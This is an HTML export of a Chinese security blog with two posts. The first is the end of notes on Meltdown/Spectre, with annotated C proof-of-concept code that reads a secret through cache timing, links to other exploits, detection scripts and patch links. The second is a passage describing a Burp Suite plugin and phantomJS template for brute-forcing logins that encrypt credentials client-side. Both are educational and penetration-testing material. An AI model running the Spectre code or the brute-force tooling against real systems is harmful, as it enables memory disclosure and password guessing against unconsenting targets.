&#125;</span><br><span class="line">        <span class="comment">/*退出此函数时 cache 中已经缓存了需要越权获取的数据*/</span></span><br><span class="line"> </span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            读取时间。执行顺序轻微混淆防止 stride prediction（某种分支预测方法）</span></span><br><span class="line"><span class="comment">            i 取值 0 - 255 对应 ASCII 码表</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">            <span class="comment">/*</span></span><br><span class="line"><span class="comment">                <span class="doctag">TODO:</span> 贼NB的数学游戏，值得叫 666</span></span><br><span class="line"><span class="comment">                167  0xA7  1010 0111</span></span><br><span class="line"><span class="comment">                13   0x0D  0000 1101</span></span><br><span class="line"><span class="comment">                取值结果为 0 - 255 随机数且不重复</span></span><br><span class="line"><span class="comment">            */</span></span><br><span class="line">            mix_i = ((i * <span class="number">167</span>) + <span class="number">13</span>) &amp; <span class="number">255</span>;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">/*addr 取 arrary2 中 0-255 组的首地址*/</span></span><br><span class="line">            addr = &amp;array2[mix_i * <span class="number">512</span>];</span><br><span class="line"> </span><br><span class="line">            <span class="comment">/*junk 保存 TSC_AUX 寄存器值，time1 保存当前时间戳*/</span></span><br><span class="line">            time1 = __rdtscp(&amp;junk);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">/*获取数据，用以测试时间*/</span></span><br><span class="line">            junk = *addr;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">/*记录并获取耗时*/</span></span><br><span class="line">            time2 = __rdtscp(&amp;junk) - time1;</span><br><span class="line"> </span><br><span class="line">            <span class="comment">/*判断是否命中，且 mix_i 不能取 1 - 16，因为 1 - 16 在获取时是无效的*/</span></span><br><span class="line">            <span class="keyword">if</span> (time2 &lt;= iThreshold &amp;&amp; mix_i != array1[tries % array1_size])</span><br><span class="line">                <span class="comment">/*cache arrary2中的 0-255 项命中则 +1 分*/</span></span><br><span class="line">                results[mix_i]++;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/*获取分组中命中率最高的两个分组，分别存储在 j(最高命中),k（次高命中）里*/</span></span><br><span class="line">        j = k = <span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="number">256</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j &lt; <span class="number">0</span> || results[i] &gt;= results[j]) &#123;</span><br><span class="line">                k = j;</span><br><span class="line">                j = i;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span> (k &lt; <span class="number">0</span> || results[i] &gt;= results[k]) &#123;</span><br><span class="line">                k = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            最高命中项命中次数大于 2 倍加 5 的次高命中项次数</span></span><br><span class="line"><span class="comment">            或</span></span><br><span class="line"><span class="comment">            仅仅最高命中项命中 2 次</span></span><br><span class="line"><span class="comment">            则</span></span><br><span class="line"><span class="comment">            退出循环，成功找到命中项</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (results[j] &gt;= (<span class="number">2</span> * results[k] + <span class="number">5</span>) || (results[j] == <span class="number">2</span> &amp;&amp; results[k] == <span class="number">0</span>))</span><br><span class="line">            <span class="keyword">break</span>; <span class="comment">/* Clear success if best is &gt; 2*runner-up + 5 or 2/0) */</span></span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*使用 junk 防止优化输出*/</span></span><br><span class="line">    results[<span class="number">0</span>] ^= junk;</span><br><span class="line">    value[<span class="number">0</span>] = (<span class="keyword">uint8_t</span>)j;<span class="comment">//最高命中项</span></span><br><span class="line">    score[<span class="number">0</span>] = results[j];<span class="comment">//最高命中项命中次数</span></span><br><span class="line">    value[<span class="number">1</span>] = (<span class="keyword">uint8_t</span>)k;<span class="comment">//次高命中项</span></span><br><span class="line">    score[<span class="number">1</span>] = results[k];<span class="comment">//次高命中项命中次数</span></span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> malicious_x = (<span class="keyword">size_t</span>)(secret - (<span class="keyword">char</span>*)array1); <span class="comment">/* 相对地址 */</span></span><br><span class="line">    <span class="keyword">int</span> i, score[<span class="number">2</span>], iLen = __MAGICWORDSCOUNT, iCount = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> *opt, *addr;</span><br><span class="line">    <span class="keyword">uint8_t</span> value[<span class="number">2</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Provide by CSZQ\n"</span>);</span><br><span class="line">    <span class="comment">/*参数解析*/</span></span><br><span class="line">    <span class="keyword">if</span> (argc &gt; <span class="number">1</span>) &#123;</span><br><span class="line">        opt = (<span class="keyword">char</span>*)&amp;argv[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">switch</span> (*opt) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'h'</span>:</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"-h  help\n-t 设置阀值，建议取值 16 - 176 之间，默认 50\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">'t'</span>:</span><br><span class="line">            <span class="keyword">if</span> (argc==<span class="number">2</span>) &#123;</span><br><span class="line">                <span class="built_in">sscanf</span>(opt + <span class="number">1</span>, <span class="string">"%d"</span>, &amp;iThreshold);</span><br><span class="line">            &#125; </span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">sscanf</span>(argv[<span class="number">2</span>], <span class="string">"%d"</span>, &amp;iThreshold);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(array2); i++)</span><br><span class="line">        array2[i] = <span class="number">1</span>; <span class="comment">/* 避免写时复制 */</span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __DEBUG &gt; 0</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Reading %d bytes:\n"</span>, iLen);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    i = iLen;</span><br><span class="line">    <span class="keyword">while</span> (--i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __DEBUG &gt; 0</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"读取地址：%p "</span>, (<span class="keyword">void</span>*)malicious_x);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"> </span><br><span class="line">        readMemoryByte(malicious_x++, value, score);</span><br><span class="line">        addr = (<span class="keyword">char</span>*)array1 + malicious_x - <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (value[<span class="number">0</span>] == *addr) &#123;</span><br><span class="line">            iCount += (score[<span class="number">0</span>] &gt; <span class="number">2</span> * score[<span class="number">1</span>]) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">         </span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> __DEBUG &gt; 0</span></span><br><span class="line">        <span class="comment">/*如果最高命中项命中次数大于等于 2 倍的次高命中项，认为分支预测成功*/</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"%s: "</span>, (score[<span class="number">0</span>] &gt;= <span class="number">2</span> * score[<span class="number">1</span>] ? <span class="string">"成功"</span> : <span class="string">"...."</span>));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"value:0x%02X char=%c counts=%d "</span>, value[<span class="number">0</span>],</span><br><span class="line">            ((value[<span class="number">0</span>] &gt; <span class="number">31</span> &amp;&amp; value[<span class="number">0</span>] &lt; <span class="number">127</span>) ? (<span class="keyword">char</span>)value[<span class="number">0</span>] : <span class="string">'?'</span>), score[<span class="number">0</span>]);</span><br><span class="line">        <span class="keyword">if</span> (score[<span class="number">1</span>] &gt; <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"(可能:value:0x%02X char=%c counts=%d)"</span>, value[<span class="number">1</span>], ((value[<span class="number">0</span>] &gt; <span class="number">31</span> &amp;&amp; value[<span class="number">0</span>] &lt; <span class="number">127</span>) ? (<span class="keyword">char</span>)value[<span class="number">0</span>] : <span class="string">'?'</span>), score[<span class="number">1</span>]);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/*命中次数超过 1/5 认为存在BUG，过低有可能是巧合或阀值需要调整*/</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%s\r\n"</span>, (iCount &gt;= __MAGICWORDSCOUNT / <span class="number">5</span>) ? <span class="string">"---&gt;存在BUG！！!&lt;---"</span> : <span class="string">"---&gt;不存在BUG&lt;---"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d 阀值下命中率为:%d / %d\r\n"</span>, iThreshold, iCount, iLen);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"按任意键退出程序...\r\n"</span>);</span><br><span class="line">    getchar();</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> (<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-2Window平台测试："><a href="#2-2Window平台测试：" class="headerlink" title="2.2Window平台测试："></a>2.2Window平台测试：</h4><ul><li>操作系统：Windows 7 sp1</li><li>编译器：vs2015</li><li>编译好的poc：<a href="spectre_win_poc.rar">spectre_win_poc.rar</a></li></ul><p><img src="/articles/2018/learning-notes-of-meltdown-and-spectre/Windows_poc.png" alt="Windwos平台复现"></p><h4 id="2-3Linux平台测试："><a href="#2-3Linux平台测试：" class="headerlink" title="2.3Linux平台测试："></a>2.3Linux平台测试：</h4><ul><li>操作系统：kali1 (2016-07-21) x86_64</li><li>编译器：gcc 6.3.0</li></ul><p><img src="/articles/2018/learning-notes-of-meltdown-and-spectre/Linux_poc.gif" alt="Linux平台复现"></p><h4 id="2-4其他poc汇总"><a href="#2-4其他poc汇总" class="headerlink" title="2.4其他poc汇总"></a>2.4其他poc汇总</h4><p>目前网上有很多poc，大家可以下去好好测试一下，最好认真研究大牛们写的代码。</p><p><a href="https://github.com/HarsaroopDhillon/SpectreExploit" target="_blank" rel="noopener">https://github.com/HarsaroopDhillon/SpectreExploit</a></p><p><a href="https://github.com/turbo/KPTI-PoC-Collection" target="_blank" rel="noopener">https://github.com/turbo/KPTI-PoC-Collection</a></p><p>处理器漏洞 Metldown Poc: 从 Google Chrome 中读取密码</p><p><a href="https://github.com/RealJTG/Meltdown`" target="_blank" rel="noopener">https://github.com/RealJTG/Meltdown`</a></p><p>AArch64 硬件平台Spectre PoC（从用户模式读取所有的 ARM 系统寄存器）</p><p><a href="https://github.com/lgeek/spec_poc_arm" target="_blank" rel="noopener">https://github.com/lgeek/spec_poc_arm</a></p><p>spectre meltdown poc</p><p><a href="https://github.com/mniip/spectre-meltdown-poc" target="_blank" rel="noopener">https://github.com/mniip/spectre-meltdown-poc</a></p><p>检查 Linux 主机是否受处理器漏洞Spectre &amp; Meltdown 的影响</p><p><a href="https://github.com/speed47/spectre-meltdown-checker" target="_blank" rel="noopener">https://github.com/speed47/spectre-meltdown-checker</a></p><p>Meltdown exploit</p><p><a href="https://github.com/paboldin/meltdown-exploit" target="_blank" rel="noopener">https://github.com/paboldin/meltdown-exploit</a></p><p>Meltdown PoC</p><p><a href="https://github.com/GitMirar/meltdown-poc" target="_blank" rel="noopener">https://github.com/GitMirar/meltdown-poc</a></p><p>Metldown PoC 收集. 当前包括2个视频, 5个Demo</p><p><a href="https://github.com/IAIK/meltdown/" target="_blank" rel="noopener">https://github.com/IAIK/meltdown/</a></p><h2 id="0x03漏洞检测"><a href="#0x03漏洞检测" class="headerlink" title="0x03漏洞检测"></a>0x03漏洞检测</h2><h4 id="3-1Windows平台"><a href="#3-1Windows平台" class="headerlink" title="3.1Windows平台"></a>3.1Windows平台</h4><p>微软官方出了一个Powershell检测脚本，有两个安装方法，大家自行根据自己的系统和WMF版本来选择合适的方法。</p><h5 id="3-1-1方法一"><a href="#3-1-1方法一" class="headerlink" title="3.1.1方法一"></a>3.1.1方法一</h5><p>适合Windows Server 2016或者WMF版本是5.0/5.1</p><h6 id="（1）安装PowerShell模块"><a href="#（1）安装PowerShell模块" class="headerlink" title="（1）安装PowerShell模块"></a>（1）安装PowerShell模块</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PS&gt; Install-Module SpeculationControl</span><br></pre></td></tr></table></figure><h6 id="（2）运行验证模块"><a href="#（2）运行验证模块" class="headerlink" title="（2）运行验证模块"></a>（2）运行验证模块</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PS&gt; <span class="comment"># Save the current execution policy so it can be reset</span></span><br><span class="line">PS&gt; <span class="variable">$SaveExecutionPolicy</span> = <span class="built_in">Get-ExecutionPolicy</span></span><br><span class="line">PS&gt; <span class="built_in">Set-ExecutionPolicy</span> RemoteSigned -Scope Currentuser</span><br><span class="line">PS&gt; <span class="built_in">Import-Module</span> SpeculationControl</span><br><span class="line">PS&gt; Get-SpeculationControlSettings</span><br><span class="line">PS&gt; <span class="comment"># Reset the execution policy to the original state</span></span><br><span class="line">PS&gt; <span class="built_in">Set-ExecutionPolicy</span> <span class="variable">$SaveExecutionPolicy</span> -Scope Currentuser</span><br></pre></td></tr></table></figure><h5 id="3-1-2方法二"><a href="#3-1-2方法二" class="headerlink" title="3.1.2方法二"></a>3.1.2方法二</h5><p>适合系统版本或WMF版本比较老</p><h6 id="（1）下载并解压好脚本"><a href="#（1）下载并解压好脚本" class="headerlink" title="（1）下载并解压好脚本"></a>（1）下载并解压好脚本</h6><p>脚本下载地址：<a href="https://aka.ms/SpeculationControlPS" target="_blank" rel="noopener">https://aka.ms/SpeculationControlPS</a></p><h6 id="（2）导入并执行验证模块"><a href="#（2）导入并执行验证模块" class="headerlink" title="（2）导入并执行验证模块"></a>（2）导入并执行验证模块</h6><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">PS&gt; <span class="comment"># Save the current execution policy so it can be reset</span></span><br><span class="line">PS&gt; <span class="variable">$SaveExecutionPolicy</span> = <span class="built_in">Get-ExecutionPolicy</span></span><br><span class="line">PS&gt; <span class="built_in">Set-ExecutionPolicy</span> RemoteSigned -Scope Currentuser</span><br><span class="line">PS&gt; CD 解压脚本目录</span><br><span class="line">PS&gt; <span class="built_in">Import-Module</span> .\SpeculationControl.psd1</span><br><span class="line">PS&gt; Get-SpeculationControlSettings</span><br><span class="line">PS&gt; <span class="comment"># Reset the execution policy to the original state</span></span><br><span class="line">PS&gt; <span class="built_in">Set-ExecutionPolicy</span> <span class="variable">$SaveExecutionPolicy</span> -Scope Currentuser</span><br></pre></td></tr></table></figure><p>我本机是win7系统，所以选用第二种方法。但在导入验证模块时出错了。</p><p><img src="/articles/2018/learning-notes-of-meltdown-and-spectre/PowerShell_error.png" alt="导入报错"></p><p>这是因为Win7系统默认是Powershell是2.0，得升级版本。我升级到了PowerShell 4.0版本后，就可以成功导入模块并检测了。</p><p><img src="/articles/2018/learning-notes-of-meltdown-and-spectre/PowerShell_check.png" alt="检查成功"></p><h4 id="3-2Linux平台"><a href="#3-2Linux平台" class="headerlink" title="3.2Linux平台"></a>3.2Linux平台</h4><p>Linux平台可以使用github上的一个检测脚本。</p><p>github地址：<code>https://github.com/raphaelsc/Am-I-affected-by-Meltdown</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/raphaelsc/Am-I-affected-by-Meltdown.git</span><br><span class="line"><span class="built_in">cd</span> ./Am-I-affected-by-Meltdown</span><br><span class="line">make</span><br><span class="line">./meltdown-checker</span><br></pre></td></tr></table></figure><p><img src="/articles/2018/learning-notes-of-meltdown-and-spectre/am_i_affected_by_meltdown.png" alt="存在风险"></p><h2 id="0x04漏洞修复"><a href="#0x04漏洞修复" class="headerlink" title="0x04漏洞修复"></a>0x04漏洞修复</h2><h4 id="4-1Windows操作系统（7-8-10）和Microsoft-Edge-IE"><a href="#4-1Windows操作系统（7-8-10）和Microsoft-Edge-IE" class="headerlink" title="4.1Windows操作系统（7/8/10）和Microsoft Edge/IE"></a>4.1Windows操作系统（7/8/10）和Microsoft Edge/IE</h4><p>下载地址：<a href="https://www.catalog.update.microsoft.com/Search.aspx?q=KB4056892" target="_blank" rel="noopener">https://www.catalog.update.microsoft.com/Search.aspx?q=KB4056892</a></p><h4 id="4-2火狐浏览器"><a href="#4-2火狐浏览器" class="headerlink" title="4.2火狐浏览器"></a>4.2火狐浏览器</h4><p>Mozilla发布了Firefox版本57.0.4，其中包括针对Spectre（幽灵）和Meltdown（熔毁）攻击的缓解措施。建议用户尽快更新安装。</p><p>下载链接为：<a href="https://www.mozilla.org/en-US/security/advisories/mfsa2018-01/" target="_blank" rel="noopener">https://www.mozilla.org/en-US/security/advisories/mfsa2018-01/</a></p><h4 id="4-3Google-Chrome浏览器"><a href="#4-3Google-Chrome浏览器" class="headerlink" title="4.3Google Chrome浏览器"></a>4.3Google Chrome浏览器</h4><h4 id="4-4Linux"><a href="#4-4Linux" class="headerlink" title="4.4Linux"></a>4.4Linux</h4><p>Linux内核开发者还发布了Linux内核的补丁。包括版本：4.14.11，4.9.74，4.4.109，3.16.52，3.18.91，3.2.97</p><p>下载链接：<a href="https://www.kernel.org/" target="_blank" rel="noopener">https://www.kernel.org/</a></p><p>（1）RedHat已发布补丁</p><p><a href="https://access.redhat.com/security/vulnerabilities/speculativeexecution?sc_cid=701f2000000tsLNAAY" target="_blank" rel="noopener">https://access.redhat.com/security/vulnerabilities/speculativeexecution?sc_cid=701f2000000tsLNAAY</a></p><p>（2）Ubuntu：已提供修复补丁</p><p><a href="https://insights.ubuntu.com/2018/01/04/ubuntu-updates-for-the-meltdown-spectre-vulnerabilities/" target="_blank" rel="noopener">https://insights.ubuntu.com/2018/01/04/ubuntu-updates-for-the-meltdown-spectre-vulnerabilities/</a></p><p>（3）SUSE：已陆续发布补丁</p><p><a href="https://www.suse.com/support/kb/doc/?id=7022512" target="_blank" rel="noopener">https://www.suse.com/support/kb/doc/?id=7022512</a></p><h4 id="4-5VMware"><a href="#4-5VMware" class="headerlink" title="4.5VMware"></a>4.5VMware</h4><p><a href="https://www.vmware.com/us/security/advisories/VMSA-2018-0002.html" target="_blank" rel="noopener">https://www.vmware.com/us/security/advisories/VMSA-2018-0002.html</a></p><h2 id="0x05参考资料"><a href="#0x05参考资料" class="headerlink" title="0x05参考资料"></a>0x05参考资料</h2><p><a href="http://www.antiy.com/response/Meltdown.html#_motz_" target="_blank" rel="noopener">处理器A级漏洞Meltdown(熔毁)和Spectre(幽灵)分析报告</a></p><p><a href="https://bbs.pediy.com/thread-223836.htm" target="_blank" rel="noopener">通俗理解这次的CPU漏洞</a></p><p><a href="https://bbs.pediy.com/thread-223824.htm" target="_blank" rel="noopener">最近比较火的CPU漏洞解析，附带修改过带注释源码一份</a></p><p><a href="http://www.hackliu.com/?p=187" target="_blank" rel="noopener">CPU特性漏洞测试POC(Meltdown and Spectre)</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>编写加密传输爆破插件jsEncrypter</title>
      <link href="/articles/2017/jsEncrypter/"/>
      <url>/articles/2017/jsEncrypter/</url>
      
        <content type="html"><![CDATA[<p>我曾经听某大牛所过两句话：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 我们能入侵最先进的系统，却不能阻止用户使用弱口令。</span><br><span class="line"></span><br><span class="line">2. 当一个系统的用户超过1000+,那么弱口令一定存在！</span><br></pre></td></tr></table></figure><p>不管这两句话是否属实，但都说明了一个问题，弱口令虽然简单，但是很难完全消除。因为它的问题不是出现在技术层面，而是在人性！所以每次渗透测试我都比较注重弱口令的检测。</p><p>当一个系统没有对登录次数进行限制时，我们就可以考虑进行爆破了。在我经验中，爆破遇到了以下三个难点：</p><table><thead><tr><th align="center">序号</th><th align="center">情况</th><th align="center">解决</th></tr></thead><tbody><tr><td align="center">1</td><td align="center">验证码</td><td align="center">验证码有的可以绕过，无法绕开也已经存在识别验证码的插件。</td></tr><tr><td align="center">2</td><td align="center">token</td><td align="center">token问题，使用burp Suite完全可以解决。</td></tr><tr><td align="center">3</td><td align="center">加密传输</td><td align="center">目前解决方案比较少，对应的工具基本没有找到。</td></tr></tbody></table><p><strong>今天特地对第三种情况进行解决，所以有了此文！</strong></p><p>针对加密传输问题，freeBuf上的<a href="http://www.freebuf.com/articles/web/127888.html" target="_blank" rel="noopener">《对登录中账号密码进行加密之后再传输的爆破的思路和方式》</a>写的挺好，作者提供了4种思路去解决，比我思考的全面。我最初的解决方案类似文章中的第四种思路，今天的解决方案是写一个Burp插件，和文章中的第一种思路类似但又有点区别。</p><h2 id="0x01-流程"><a href="#0x01-流程" class="headerlink" title="0x01 流程"></a>0x01 流程</h2><p>上一个流程图，给大家捋一捋插件运行的整个流程。</p><p><img src="/articles/2017/jsEncrypter/liucheng.png" alt="图1-流程图"></p><h2 id="0x02-开发"><a href="#0x02-开发" class="headerlink" title="0x02 开发"></a>0x02 开发</h2><h4 id="插件核心代码"><a href="#插件核心代码" class="headerlink" title="插件核心代码"></a>插件核心代码</h4><p>我们的插件实现对payload的处理，所以一定要实现Burp Suite APIs的<code>IIntruderPayloadProcessor</code>接口的<code>processPayload</code>方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">byte</span>[] processPayload(<span class="keyword">byte</span>[] currentPayload, <span class="keyword">byte</span>[] originalPayload, <span class="keyword">byte</span>[] baseValue) &#123;</span><br><span class="line"><span class="keyword">byte</span>[] newpayload =<span class="string">""</span>.getBytes();</span><br><span class="line">String payload = <span class="keyword">new</span> String(currentPayload); <span class="comment">//获取当前paylaod</span></span><br><span class="line">CloseableHttpClient client = HttpClients.createDefault(); <span class="comment">//新建一个HttpClient</span></span><br><span class="line">HttpPost httpPost = <span class="keyword">new</span> HttpPost(gui.getURL()); <span class="comment">//新建一个post请求</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">List nameValuePairs = <span class="keyword">new</span> ArrayList(<span class="number">1</span>);</span><br><span class="line">nameValuePairs.add(<span class="keyword">new</span> BasicNameValuePair(<span class="string">"payload"</span>,payload)); <span class="comment">//添加payload参数</span></span><br><span class="line">httpPost.setEntity(<span class="keyword">new</span> UrlEncodedFormEntity(nameValuePairs)); <span class="comment">//设置HttpPost实体</span></span><br><span class="line">CloseableHttpResponse response = client.execute(httpPost); <span class="comment">//发送带有payload的请求</span></span><br><span class="line"><span class="comment">//获取phantomJS处理好的结果</span></span><br><span class="line">String responseAsString = EntityUtils.toString(response.getEntity());</span><br><span class="line">newpayload = helpers.stringToBytes(responseAsString);</span><br><span class="line"></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">stderr.println(e.getMessage());</span><br><span class="line">newpayload = <span class="string">"JsEncrypter cannot connect phantomJS!"</span>.getBytes();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> newpayload; <span class="comment">//返回处理好的payload给Burp Suite</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="phantomJS脚本编写"><a href="#phantomJS脚本编写" class="headerlink" title="phantomJS脚本编写"></a>phantomJS脚本编写</h4><p>phantomJS是一个没有界面的浏览器，除了不能浏览，其他的和正常浏览器一样。使用它来执行我们编写好的脚本。</p><p>phantomJS下载地址：<code>http://phantomjs.org/download.html</code></p><p>由于每个网站前端加密传输的算法一样，所以每次引入的js都不同，调用加密函数的代码也不仅相同。鉴于以上情况，为了每次不用重复写一些固定的代码，我们写一个模板代码。每次使用时，只要填写好引入js的文件名，以及实现好在<code>js_encrypt()</code>函数体调用加密算法对payload进行加密处理即可。</p><h6 id="phatomJS脚本模板代码"><a href="#phatomJS脚本模板代码" class="headerlink" title="phatomJS脚本模板代码"></a>phatomJS脚本模板代码</h6><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author: c0ny1</span></span><br><span class="line"><span class="comment"> * date: 2017-12-16</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">var</span> webserver = <span class="built_in">require</span>(<span class="string">'webserver'</span>);</span><br><span class="line">server = webserver.create();</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> host = <span class="string">'127.0.0.1'</span>;</span><br><span class="line"><span class="keyword">var</span> port = <span class="string">'1664'</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 加载实现加密算法的js脚本</span></span><br><span class="line"><span class="keyword">var</span> wasSuccessful = phantom.injectJs(<span class="string">'xxx.js'</span>);<span class="comment">/*引入实现加密的js文件*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理函数</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">js_encrypt</span>(<span class="params">payload</span>)</span>&#123;</span><br><span class="line"><span class="keyword">var</span> newpayload;</span><br><span class="line"><span class="comment">/**********在这里编写调用加密函数进行加密的代码************/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**********************************************************/</span></span><br><span class="line"><span class="keyword">return</span> newpayload;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(wasSuccessful)&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] load js successful"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[!] ^_^"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[*] jsEncrypterJS start!"</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"[+] address: http://"</span>+host+<span class="string">":"</span>+port);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">'[*] load js fail!'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> service = server.listen(host+<span class="string">':'</span>+port,<span class="function"><span class="keyword">function</span>(<span class="params">request, response</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(request.method == <span class="string">'POST'</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> payload = request.post[<span class="string">'payload'</span>];</span><br><span class="line">        <span class="keyword">var</span> encrypt_payload = js_encrypt(payload); </span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'[+] '</span> + payload + <span class="string">':'</span> + encrypt_payload); <span class="comment">//显示原始payload和加密处理好的payload</span></span><br><span class="line">response.statusCode = <span 